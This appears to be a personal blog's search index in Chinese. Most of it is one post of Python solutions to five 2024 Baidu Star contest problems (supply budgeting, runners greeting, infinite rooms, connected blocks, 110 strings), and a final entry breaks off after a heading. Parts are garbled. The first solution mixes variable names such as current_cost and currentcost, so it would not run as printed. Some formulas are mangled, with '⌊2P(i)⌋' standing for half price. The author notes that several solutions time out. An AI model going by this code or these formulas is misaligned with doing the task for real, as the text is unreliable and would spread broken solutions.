<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>/2025/07/16/HANDS%20ON%20LLM/</url>
    <content><![CDATA[<p>HANDS ON LLM</p>
]]></content>
  </entry>
  <entry>
    <title>24百度之星第一场代码题解</title>
    <url>/2025/08/06/24%E7%99%BE%E5%BA%A6%E4%B9%8B%E6%98%9F%E7%AC%AC%E4%B8%80%E5%9C%BA%E4%BB%A3%E7%A0%81%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>必须吐槽一下百度之星在码蹄集上沟槽的只有c艹的解法，python的解法还在藏，后悔用python备赛了，写了一整个白天只写了5题，byd的真难写</p>
<h2 id="补给">补给</h2>
<h3 id="题目描述">题目描述</h3>
<p>可怕的战争发生了，小度作为后勤保障工作人员，也要为了保卫国家而努力。</p>
<p>现在有 <em>N</em> 个堡垒需要补给，然而总的预算 <em>B</em>
是有限的。</p>
<p>现在已知第 <em>i</em> 个堡垒需要价值 <em>P</em>(<em>i</em>)
的补给，并且需要 <em>S</em>(<em>i</em>) 的运费。</p>
<p>鉴于小度与供应商之间长期稳定的合作关系，供应商慷慨地提供了一次特别的采购优惠。具体而言，小度可以选择对某次补给进行半价采购。这意味着，如果小度决定在向第
<em>i</em>
个堡垒提供补给时利用这一优惠，那么此次补给的采购及运输总费用将减少至
⌊2<em>P</em>(<em>i</em>)⌋+<em>S</em>(<em>i</em>)，其中优惠价格按照向下取整的原则计算。对于其他堡垒
<em>j</em>，补给的采购和运输费用则保持不变，即
<em>P</em>(<em>j</em>)+<em>S</em>(<em>j</em>)。</p>
<p>请计算小度的最多能给多少堡垒提供补给？</p>
<h3 id="输入格式">输入格式</h3>
<p>输入共 2 行。</p>
<p>第 1 行 2 个整数，分别表示 <em>N</em> 和 <em>B</em>。</p>
<p>第 2 到 <em>N</em>+1 行每行 2 个整数，分别表示 <em>P</em>(<em>i</em>)
和 <em>S</em>(<em>i</em>)。</p>
<h3 id="输出格式">输出格式</h3>
<p>输出共 1 行 1 个整数，表示能提供补给的最大数。</p>
<h3 id="题解">题解</h3>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">def solve():</span><br><span class="line">    <span class="keyword">N</span>, B = <span class="keyword">map</span>(<span class="keyword">int</span>, <span class="built_in">input</span>().<span class="keyword">split</span>())</span><br><span class="line">    costs = []</span><br><span class="line">    <span class="keyword">for</span> _ in <span class="built_in">range</span>(<span class="keyword">N</span>):</span><br><span class="line">        <span class="keyword">p</span>, s = <span class="keyword">map</span>(<span class="keyword">int</span>, <span class="built_in">input</span>().<span class="keyword">split</span>())</span><br><span class="line">        costs.<span class="keyword">append</span>((<span class="keyword">p</span>, s))</span><br><span class="line">    </span><br><span class="line">    maxcount = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="keyword">N</span>):</span><br><span class="line">        total = <span class="number">0</span></span><br><span class="line">        current_cost = (costs[i][<span class="number">0</span>] // <span class="number">2</span>) + costs[i][<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> currentcost &gt; B:</span><br><span class="line">            <span class="keyword">continue</span> </span><br><span class="line">        </span><br><span class="line">        temp_costs = []</span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">j</span> in <span class="built_in">range</span>(<span class="keyword">N</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">j</span> != i:</span><br><span class="line">                temp_costs.<span class="keyword">append</span>(costs[<span class="keyword">j</span>][<span class="number">0</span>] + costs[<span class="keyword">j</span>][<span class="number">1</span>])</span><br><span class="line">        temp_costs.<span class="keyword">sort</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">count</span> = <span class="number">1</span></span><br><span class="line">        totalcost = current_cost</span><br><span class="line">        <span class="keyword">for</span> cost in tempcosts:</span><br><span class="line">            <span class="keyword">if</span> totalcost + cost &lt;= B:</span><br><span class="line">                totalcost += cost</span><br><span class="line">                <span class="built_in">count</span> += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">count</span> &gt; maxcount:</span><br><span class="line">            max_count = <span class="built_in">count</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    tempcosts = [costs[i][<span class="number">0</span>] + costs[i][<span class="number">1</span>] <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="keyword">N</span>)]</span><br><span class="line">    tempcosts.<span class="keyword">sort</span>()</span><br><span class="line">    total_cost = <span class="number">0</span></span><br><span class="line">    <span class="built_in">count</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> cost in tempcosts:</span><br><span class="line">        <span class="keyword">if</span> totalcost + cost &lt;= B:</span><br><span class="line">            totalcost += cost</span><br><span class="line">            <span class="built_in">count</span> += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">count</span> &gt; maxcount:</span><br><span class="line">        maxcount = <span class="built_in">count</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span>(max_count)</span><br><span class="line"></span><br><span class="line">solve()</span><br></pre></td></tr></table></figure>
<p>贪心算法，不算非常难</p>
<h2 id="跑步">跑步</h2>
<h3 id="题目描述-1">题目描述</h3>
<p>小度与他的同学们十分的热爱运动，现有包括小度在内的 <em>n</em>
名同学想要去某圆形操场跑步。</p>
<p>已知第 <em>i</em> 名同学跑一圈的时间为 <em>i</em>
分钟一圈。小度他们规定，他们 <em>n</em> 名同学同时从起点出发，一直跑到
<em>n</em> 名同学同时到达起点时停止。</p>
<p>对于任意两名同学，如果在某一时刻的位置相同，那么他们便会打 1
次招呼。如果同时有多名同学在某一时刻都在同一位置，那么每一对同学都会相互之间打招呼。注：最后一起到终点的时候，也会打一次招呼。</p>
<p>现在小度想要问你，直到跑步结束所有同学相互之间一共会打多少次招呼。由于答案过大，所以希望你将答案对
998244353 取模。</p>
<h3 id="输入格式-1">输入格式</h3>
<p>输入共 1 行 1 个整数，表示参加跑步的同学人数 <em>n</em>。</p>
<h3 id="输出格式-1">输出格式</h3>
<p>输出共 1 行 1 个整数，表示答案。</p>
<h3 id="题解-1">题解</h3>
<p>这题洛谷ac，码蹄tle了几个测试点，尽力了优化不出来了</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">import math</span><br><span class="line"></span><br><span class="line"><span class="built_in">N</span> = <span class="number">10</span>**<span class="number">7</span> + <span class="number">10</span></span><br><span class="line"><span class="built_in">MOD</span> = <span class="number">998244353</span></span><br><span class="line">INF = <span class="number">0</span>x7fffffffffffffff</span><br><span class="line"></span><br><span class="line">def ini(<span class="built_in">n</span>)<span class="symbol">:</span></span><br><span class="line">    ispri = [<span class="number">1</span>] * (<span class="built_in">n</span> + <span class="number">1</span>)</span><br><span class="line">    ispri[<span class="number">0</span>] = ispri[<span class="number">1</span>] = <span class="number">0</span>  # <span class="number">0</span> <span class="built_in">and</span> <span class="number">1</span> are <span class="built_in">not</span> primes</span><br><span class="line">    pri = []</span><br><span class="line"></span><br><span class="line">    for i in range(<span class="number">2</span>, <span class="built_in">n</span> + <span class="number">1</span>)<span class="symbol">:</span></span><br><span class="line">        <span class="built_in">if</span> ispri[i]<span class="symbol">:</span></span><br><span class="line">            pri.append(i)</span><br><span class="line">        for j in p<span class="symbol">ri:</span></span><br><span class="line">            tmp = j * i</span><br><span class="line">            <span class="built_in">if</span> tmp &gt; <span class="symbol">n:</span></span><br><span class="line">                break</span><br><span class="line">            ispri[tmp] = <span class="number">0</span></span><br><span class="line">            <span class="built_in">if</span> i % j == <span class="symbol">0:</span></span><br><span class="line">                break</span><br><span class="line">    return pri</span><br><span class="line"></span><br><span class="line">def solve()<span class="symbol">:</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">n</span> = <span class="built_in">int</span>(input())</span><br><span class="line"></span><br><span class="line">    pri = ini(<span class="built_in">n</span>)</span><br><span class="line">    </span><br><span class="line">    inv = [<span class="number">0</span>] * (<span class="built_in">n</span> + <span class="number">1</span>)</span><br><span class="line">    inv[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">    for i in range(<span class="number">2</span>, <span class="built_in">n</span> + <span class="number">1</span>)<span class="symbol">:</span></span><br><span class="line">        inv[i] = ((<span class="built_in">MOD</span> - <span class="built_in">MOD</span> // i * inv[<span class="built_in">MOD</span> % i] % <span class="built_in">MOD</span>) % <span class="built_in">MOD</span> + <span class="built_in">MOD</span>) % <span class="built_in">MOD</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">lcm</span> = <span class="number">1</span></span><br><span class="line">    for i in p<span class="symbol">ri:</span></span><br><span class="line">        tmp = i</span><br><span class="line">        while tmp * i &lt;= <span class="symbol">n:</span></span><br><span class="line">            tmp *= i</span><br><span class="line">        <span class="built_in">lcm</span> = <span class="built_in">lcm</span> * tmp % <span class="built_in">MOD</span></span><br><span class="line"></span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    for i in range(<span class="number">1</span>, <span class="built_in">n</span> + <span class="number">1</span>)<span class="symbol">:</span></span><br><span class="line">        pre = i - <span class="number">1</span></span><br><span class="line">        nxt = <span class="built_in">n</span> - i</span><br><span class="line">        ans = (ans + (nxt * <span class="built_in">lcm</span>) % <span class="built_in">MOD</span> * inv[i] % <span class="built_in">MOD</span> - (pre * <span class="built_in">lcm</span>) % <span class="built_in">MOD</span> * inv[i] % <span class="built_in">MOD</span>) % <span class="built_in">MOD</span></span><br><span class="line"></span><br><span class="line">    print((ans + <span class="built_in">MOD</span>) % <span class="built_in">MOD</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">t</span> = <span class="number">1</span>  </span><br><span class="line">while <span class="symbol">t:</span></span><br><span class="line">    solve()</span><br><span class="line">    <span class="built_in">t</span> -= <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="无限房间">无限房间</h2>
<h3 id="题目描述-2">题目描述</h3>
<p>有一排无限长的房间，编号分别为 0,1,2,⋯。对于 <em>i</em> 号房间，其中
<em>i</em>&gt;0，如果至少有 <em>i</em> 个人，你可以将房间中的 <em>i</em>
个人安排到 0,1,⋯,<em>i</em>−1
房间中去，每个房间各一个人。如果有多个操作可以选，你可以选择任意一个你喜欢的进行操作。</p>
<p>现在，所有房间是空的，有 <em>K</em>
个人需要你来安排房间，要求安排好之后，你可以通过任意次数的上述操作使所有人都来到
0 号房间。</p>
<p>这个安排是非常容易的，你只要让大家都住进 0 号房间就好了。</p>
<p>但是，由于未知原因，房客们都喜欢住编号比较大的房间，所以希望你能够提供一个满足条件的，同时反字典序最小的方案。</p>
<p>对于两个房间安排方案 <em>A</em> 和 <em>B</em>，其中 *A**i* 表示编号为
<em>i</em> 的房间住几个人，*B**i* 同理，我们说 <em>A</em> 的反字典序比
<em>B</em> 小，当且仅当：</p>
<p>∃ <em>i</em>,<em>A<strong>i<em>&gt;</em>B</strong>i</em> and ∀
<em>j</em>&gt;<em>i</em>,<em>A<strong>j<em>=</em>B</strong>j</em></p>
<p>小度觉得这个签到题太简单了，随手就切掉了。但是他觉得这个题很有趣，所以希望你也来做一做。</p>
<h3 id="输入格式-2">输入格式</h3>
<p>输入共 1 行 1 个整数，表示人数 <em>K</em>。</p>
<h3 id="输出格式-2">输出格式</h3>
<p>输出共 <em>N</em> 行，其中 <em>N</em>
代表有人住的房间的个数，无需输出。</p>
<p>每行 2 个整数，分别表示一个有人住的房间的编号 ID<em>i</em> 和住的人数
NUM<em>i</em>。要求按照 ID 升序输出</p>
<h3 id="题解-2">题解</h3>
<p>纯思路题</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">n = int(sys.stdin.<span class="built_in">readline</span>())</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> n != <span class="number">0</span>:</span><br><span class="line">    divisor = i + <span class="number">1</span></span><br><span class="line">    <span class="built_in">remainder</span> = n <span class="symbol">%</span> divisor</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">remainder</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&quot;&#123;i&#125; &#123;remainder&#125;&quot;</span>)</span><br><span class="line">        n -= <span class="built_in">remainder</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="连通块">连通块</h2>
<h3 id="题目描述-3">题目描述</h3>
<p>小度正在一个 <em>n</em>×<em>m</em>
的棋盘上进行一场独特的游戏。在这个游戏中，他会在棋盘的格子上放置若干个（可能为零个）黑棋棋子，这些棋子必须形成一个联通块。所谓联通块，是指棋盘上相互邻接的黑棋棋子所构成的集合，其中任意两个棋子之间至少存在一条路径，路径上的棋子在棋盘上都是相邻的。</p>
<p>在放置棋子的过程中，小度不断地在棋盘周围移动。突然，他产生了一个有趣的想法：他想知道，初始联通块可以在棋盘上平移的情况下，如果再额外放入不超过
<em>k</em>
个黑棋棋子，能够形成多少种本质不同的联通块。本质相同是指那些可以通过平移、旋转或与棋盘边界平行的镜像翻转操作而变成一样的联通块。</p>
<p>也就是说，最终形成的联通块，是在初始联通块的基础上，通过添加不超过
<em>k</em>
个棋子而构建的。这个新的联通块必须能够满足棋盘大小的约束，但其布局并不局限于初始联通块的位置。</p>
<p>输出满足条件的本质不同联通块的数量。</p>
<h3 id="输入格式-3">输入格式</h3>
<p>输入共 <em>T</em>+1+∑<em>n</em> 行。</p>
<p>第 1 行 1 个整数，表示数据组数 <em>T</em>。</p>
<p>接下来，对于每组数据，输入共 <em>n</em>+1 行：</p>
<ul>
<li>第 1 行 3 个整数，分别表示黑棋棋子额外最多使用数量
<em>k</em>，以及棋盘的长 <em>n</em> 和宽 <em>m</em>；</li>
<li>第 2 至 <em>n</em>+1 行，每行 <em>m</em> 个整数，均为 0 或 1。其中 0
表示一个空的棋盘格子，1 表示已经有黑色棋子放着。</li>
</ul>
<h3 id="输出格式-3">输出格式</h3>
<p>输出共 <em>T</em> 行。</p>
<p>对于每组数据，输出共 1 行 1 个整数，表示在给定的
<em>n</em>×<em>m</em> 棋盘上可以用额外不超过 <em>k</em>
个黑棋棋子构成的本质不同联通块的数量，如果初始状态有两个及以上的联通块输出
−1。</p>
<h3 id="题解-3">题解</h3>
<p>这题反而马蹄过了，洛谷过不了，搞不懂这些的数据集了，洛谷返回直接re我不懂了，甚至不是wa</p>
<figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">Dot</span>:</span></span><br><span class="line"><span class="class">    def __init__(<span class="title">self</span>, <span class="title">a</span>=0, <span class="title">b</span>=0):</span></span><br><span class="line"><span class="class">        self.x = a</span></span><br><span class="line"><span class="class">        self.y = b</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    def __lt__(<span class="title">self</span>, <span class="title">other</span>):</span></span><br><span class="line"><span class="class">        return (<span class="title">self</span>.<span class="title">x</span>, <span class="title">self</span>.<span class="title">y</span>) &lt; (<span class="title">other</span>.<span class="title">x</span>, <span class="title">other</span>.<span class="title">y</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    def __eq__(<span class="title">self</span>, <span class="title">other</span>):</span></span><br><span class="line"><span class="class">        return self.x == other.x and self.y == other.y</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    def __hash__(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        return hash((<span class="title">self</span>.<span class="title">x</span>, <span class="title">self</span>.<span class="title">y</span>))</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">def pingyi(<span class="title">x</span>):</span></span><br><span class="line"><span class="class">    if not x:</span></span><br><span class="line"><span class="class">        return</span></span><br><span class="line"><span class="class">    min_x = min(<span class="title">d</span>.<span class="title">x</span> <span class="title">for</span> <span class="title">d</span> <span class="title">in</span> <span class="title">x</span>)</span></span><br><span class="line"><span class="class">    min_y = min(<span class="title">d</span>.<span class="title">y</span> <span class="title">for</span> <span class="title">d</span> <span class="title">in</span> <span class="title">x</span>)</span></span><br><span class="line"><span class="class">    for d in x:</span></span><br><span class="line"><span class="class">        d.x -= min_x</span></span><br><span class="line"><span class="class">        d.y -= min_y</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">def ring(<span class="title">x</span>):</span></span><br><span class="line"><span class="class">    if not x:</span></span><br><span class="line"><span class="class">        return</span></span><br><span class="line"><span class="class">    pingyi(<span class="title">x</span>)</span></span><br><span class="line"><span class="class">    mx = max(<span class="title">d</span>.<span class="title">x</span> <span class="title">for</span> <span class="title">d</span> <span class="title">in</span> <span class="title">x</span>)</span></span><br><span class="line"><span class="class">    my = max(<span class="title">d</span>.<span class="title">y</span> <span class="title">for</span> <span class="title">d</span> <span class="title">in</span> <span class="title">x</span>)</span></span><br><span class="line"><span class="class">    max_dim = max(<span class="title">mx</span>, <span class="title">my</span>)</span></span><br><span class="line"><span class="class">    for d in x:</span></span><br><span class="line"><span class="class">        tmpx = d.x</span></span><br><span class="line"><span class="class">        tmpy = d.y</span></span><br><span class="line"><span class="class">        d.x = tmpy</span></span><br><span class="line"><span class="class">        d.y = max_dim - tmpx</span></span><br><span class="line"><span class="class">    pingyi(<span class="title">x</span>)</span></span><br><span class="line"><span class="class">    x.sort()</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">def rex(<span class="title">x</span>):</span></span><br><span class="line"><span class="class">    res = [<span class="type">Dot</span>(-<span class="title">d</span>.<span class="title">x</span>, <span class="title">d</span>.<span class="title">y</span>) for d in x]</span></span><br><span class="line"><span class="class">    pingyi(<span class="title">res</span>)</span></span><br><span class="line"><span class="class">    res.sort()</span></span><br><span class="line"><span class="class">    return res</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">def rey(<span class="title">x</span>):</span></span><br><span class="line"><span class="class">    res = [<span class="type">Dot</span>(<span class="title">d</span>.<span class="title">x</span>, -<span class="title">d</span>.<span class="title">y</span>) for d in x]</span></span><br><span class="line"><span class="class">    pingyi(<span class="title">res</span>)</span></span><br><span class="line"><span class="class">    res.sort()</span></span><br><span class="line"><span class="class">    return res</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">def check(<span class="title">x</span>, <span class="title">ms</span>):</span></span><br><span class="line"><span class="class">    temp = [<span class="type">Dot</span>(<span class="title">d</span>.<span class="title">x</span>, <span class="title">d</span>.<span class="title">y</span>) for d in x]</span></span><br><span class="line"><span class="class">    pingyi(<span class="title">temp</span>)</span></span><br><span class="line"><span class="class">    temp.sort()</span></span><br><span class="line"><span class="class">    shape = tuple((<span class="title">d</span>.<span class="title">x</span>, <span class="title">d</span>.<span class="title">y</span>) for d in temp)</span></span><br><span class="line"><span class="class">    if shape in ms:</span></span><br><span class="line"><span class="class">        return <span class="type">True</span></span></span><br><span class="line"><span class="class">    for _ in range(3):</span></span><br><span class="line"><span class="class">        ring(<span class="title">temp</span>)</span></span><br><span class="line"><span class="class">        shape = tuple((<span class="title">d</span>.<span class="title">x</span>, <span class="title">d</span>.<span class="title">y</span>) for d in temp)</span></span><br><span class="line"><span class="class">        if shape in ms:</span></span><br><span class="line"><span class="class">            return <span class="type">True</span></span></span><br><span class="line"><span class="class">    return <span class="type">False</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">def cnt(<span class="title">x</span>, <span class="title">v</span>, <span class="title">ms</span>, <span class="title">n</span>, <span class="title">m</span>):</span></span><br><span class="line"><span class="class">    if v &lt; 0:</span></span><br><span class="line"><span class="class">        return</span></span><br><span class="line"><span class="class">    temp = [<span class="type">Dot</span>(<span class="title">d</span>.<span class="title">x</span>, <span class="title">d</span>.<span class="title">y</span>) for d in x]</span></span><br><span class="line"><span class="class">    pingyi(<span class="title">temp</span>)</span></span><br><span class="line"><span class="class">    mx = max(<span class="title">d</span>.<span class="title">x</span> <span class="title">for</span> <span class="title">d</span> <span class="title">in</span> <span class="title">temp</span>) if temp else 0</span></span><br><span class="line"><span class="class">    my = max(<span class="title">d</span>.<span class="title">y</span> <span class="title">for</span> <span class="title">d</span> <span class="title">in</span> <span class="title">temp</span>) if temp else 0</span></span><br><span class="line"><span class="class">    if (<span class="title">mx</span> &gt;= <span class="title">n</span> <span class="title">or</span> <span class="title">my</span> &gt;= <span class="title">m</span>) and (<span class="title">mx</span> &gt;= <span class="title">m</span> <span class="title">or</span> <span class="title">my</span> &gt;= <span class="title">n</span>):</span></span><br><span class="line"><span class="class">        return</span></span><br><span class="line"><span class="class">    temp.sort()</span></span><br><span class="line"><span class="class">    shape = tuple((<span class="title">d</span>.<span class="title">x</span>, <span class="title">d</span>.<span class="title">y</span>) for d in temp)</span></span><br><span class="line"><span class="class">    if check(<span class="title">temp</span>, <span class="title">ms</span>) or check(<span class="title">rex</span>(<span class="title">temp</span>), ms) or check(<span class="title">rey</span>(<span class="title">temp</span>), ms):</span></span><br><span class="line"><span class="class">        return</span></span><br><span class="line"><span class="class">    ms.add(<span class="title">shape</span>)</span></span><br><span class="line"><span class="class">    s = set(<span class="title">x</span>)</span></span><br><span class="line"><span class="class">    for d in x:</span></span><br><span class="line"><span class="class">        for dx, dy in [(1,0), (-1,0), (0,1), (0,-1)]:</span></span><br><span class="line"><span class="class">            tmpx = d.x + dx</span></span><br><span class="line"><span class="class">            tmpy = d.y + dy</span></span><br><span class="line"><span class="class">            new_dot = <span class="type">Dot</span>(<span class="title">tmpx</span>, <span class="title">tmpy</span>)</span></span><br><span class="line"><span class="class">            if new_dot not in s:</span></span><br><span class="line"><span class="class">                new_x = [<span class="type">Dot</span>(<span class="title">dot</span>.<span class="title">x</span>, <span class="title">dot</span>.<span class="title">y</span>) for dot in x] + [new_dot]</span></span><br><span class="line"><span class="class">                pingyi(<span class="title">new_x</span>)</span></span><br><span class="line"><span class="class">                cnt(<span class="title">new_x</span>, <span class="title">v</span> - 1, <span class="title">ms</span>, <span class="title">n</span>, <span class="title">m</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">def dfs(<span class="title">x</span>, <span class="title">y</span>, <span class="title">is_visited</span>, <span class="title">sq</span>, <span class="title">n</span>, <span class="title">m</span>):</span></span><br><span class="line"><span class="class">    if x &lt; 0 or y &lt; 0 or x &gt;= n or y &gt;= m:</span></span><br><span class="line"><span class="class">        return</span></span><br><span class="line"><span class="class">    if is_visited[x][y] or not sq[x][y]:</span></span><br><span class="line"><span class="class">        return</span></span><br><span class="line"><span class="class">    is_visited[x][y] = <span class="type">True</span></span></span><br><span class="line"><span class="class">    for dx, dy in [(1,0), (-1,0), (0,1), (0,-1)]:</span></span><br><span class="line"><span class="class">        dfs(<span class="title">x</span> + <span class="title">dx</span>, <span class="title">y</span> + <span class="title">dy</span>, <span class="title">is_visited</span>, <span class="title">sq</span>, <span class="title">n</span>, <span class="title">m</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">def solve():</span></span><br><span class="line"><span class="class">    k, n, m = map(<span class="title">int</span>, <span class="title">input</span>().split())</span></span><br><span class="line"><span class="class">    sq = [list(<span class="title">map</span>(<span class="title">int</span>, <span class="title">input</span>().split())) for _ in range(<span class="title">n</span>)]</span></span><br><span class="line"><span class="class">    is_visited = [[<span class="type">False</span>] * m for _ in range(<span class="title">n</span>)]</span></span><br><span class="line"><span class="class">    pre = []</span></span><br><span class="line"><span class="class">    hx, hy = -1, -1</span></span><br><span class="line"><span class="class">    for i in range(<span class="title">n</span>):</span></span><br><span class="line"><span class="class">        for j in range(<span class="title">m</span>):</span></span><br><span class="line"><span class="class">            if sq[i][j]:</span></span><br><span class="line"><span class="class">                pre.append(<span class="type">Dot</span>(<span class="title">i</span>, <span class="title">j</span>))</span></span><br><span class="line"><span class="class">                if hx == -1:</span></span><br><span class="line"><span class="class">                    hx, hy = i, j</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    if not pre and k == 0:</span></span><br><span class="line"><span class="class">        print(0)</span></span><br><span class="line"><span class="class">        return</span></span><br><span class="line"><span class="class">    elif not pre:</span></span><br><span class="line"><span class="class">        sq[0][0] = 1</span></span><br><span class="line"><span class="class">        pre.append(<span class="type">Dot</span>(0, 0))</span></span><br><span class="line"><span class="class">        k -= 1</span></span><br><span class="line"><span class="class">        hx, hy = 0, 0</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    dfs(<span class="title">hx</span>, <span class="title">hy</span>, <span class="title">is_visited</span>, <span class="title">sq</span>, <span class="title">n</span>, <span class="title">m</span>)</span></span><br><span class="line"><span class="class">    for i in range(<span class="title">n</span>):</span></span><br><span class="line"><span class="class">        for j in range(<span class="title">m</span>):</span></span><br><span class="line"><span class="class">            if sq[i][j] and not is_visited[i][j]:</span></span><br><span class="line"><span class="class">                print(-1)</span></span><br><span class="line"><span class="class">                return</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    ms = set()</span></span><br><span class="line"><span class="class">    pre.sort()</span></span><br><span class="line"><span class="class">    cnt(<span class="title">pre</span>, <span class="title">k</span>, <span class="title">ms</span>, <span class="title">n</span>, <span class="title">m</span>)</span></span><br><span class="line"><span class="class">    print(<span class="title">len</span>(<span class="title">ms</span>))</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">t = int(<span class="title">input</span>())</span></span><br><span class="line"><span class="class">for _ in range(<span class="title">t</span>):</span></span><br><span class="line"><span class="class">    solve()</span></span><br></pre></td></tr></table></figure>
<h2 id="串">110串</h2>
<h3 id="题目描述-4">题目描述</h3>
<p>给定一个 01 序列 {<em>a<strong>n<em>}，其中
</em>a</strong>i</em>∈{0,1}。</p>
<p>我们可以修改该序列的任意一个数字，可以将 0 变成 1，也可以将 1 变成
0，注意不能删除或增加数字。</p>
<p>请问，修改不超过 <em>k</em>
个数字能让给定的序列中不含有特定的一个子串 110
的方案数有多少种，由于答案很大输出对 998244353 以后的结果即可。</p>
<h3 id="输入格式-4">输入格式</h3>
<p>输入共 2 行。</p>
<p>第 1 行 2 个整数，表示 01 序列的长度 <em>n</em>
和最多可修改的数字个数 <em>k</em>。</p>
<p>第 2 行 <em>n</em> 个整数，分别表示 01 序列中的每一项 *a**i*。</p>
<h3 id="输出格式-4">输出格式</h3>
<p>输出共 1 行 1 个整数，表示修改不超过 <em>k</em>
个数字让给定的序列中不含有 110 的方案数对 998244353 以后的结果。</p>
<h3 id="题解-4">题解</h3>
<p>部分测试数据超时，没办法了，死活扣不出来了22/25</p>
<figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="symbol">N</span> = <span class="number">5000</span> + <span class="number">10</span></span><br><span class="line"><span class="symbol">MOD</span> = <span class="number">998244353</span></span><br><span class="line"></span><br><span class="line">def solve():</span><br><span class="line">    n, q = map(int, input().split())</span><br><span class="line">    a = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    s = input().strip()</span><br><span class="line">    for i in range(n):</span><br><span class="line">        a[i + <span class="number">1</span>] = int(s[i])</span><br><span class="line">    pre = [[<span class="number">0</span>] * <span class="number">8</span> for <span class="symbol">_</span> in range(q + <span class="number">1</span>)]</span><br><span class="line">    pre[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    for i in range(n):</span><br><span class="line">        nxt = [[<span class="number">0</span>] * <span class="number">8</span> for <span class="symbol">_</span> in range(q + <span class="number">1</span>)]</span><br><span class="line">        for j in range(q + <span class="number">1</span>):</span><br><span class="line">            for k in range(<span class="number">8</span>):</span><br><span class="line">                if k != <span class="number">6</span> and pre[j][k]:</span><br><span class="line">                    v = (k &lt;&lt; <span class="number">1</span>) <span class="comment">% 8 + a[i + 1]</span></span><br><span class="line">                    vv = (k &lt;&lt; <span class="number">1</span>) <span class="comment">% 8 + (1 - a[i + 1])</span></span><br><span class="line">                    nxt[j][v] = (nxt[j][v] + pre[j][k]) <span class="comment">% MOD</span></span><br><span class="line">                    if j &lt; q:</span><br><span class="line">                        nxt[j + <span class="number">1</span>][vv] = (nxt[j + <span class="number">1</span>][vv] + pre[j][k]) <span class="comment">% MOD</span></span><br><span class="line">        pre = nxt</span><br><span class="line">    ans = sum(sum(pre[i][j] for j in range(<span class="number">8</span>) if j != <span class="number">6</span>) for i in range(q + <span class="number">1</span>)) <span class="comment">% MOD</span></span><br><span class="line">    print(ans)</span><br><span class="line"></span><br><span class="line">t = <span class="number">1</span></span><br><span class="line">while t:</span><br><span class="line">    solve()</span><br><span class="line">    t -= <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>这个假期还是有点懈怠了，还是得多多学习，找个日子把动手学习大模型的代码也传了，大工程flag</p>
]]></content>
  </entry>
  <entry>
    <title>算法备赛</title>
    <url>/2025/03/23/cpp%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>准备一下蓝桥杯</p>
<p>顺手存点代码</p>
<h1 id="一基本常见代码">一、基本常见代码</h1>
<h2 id="动态数组">1.动态数组</h2>
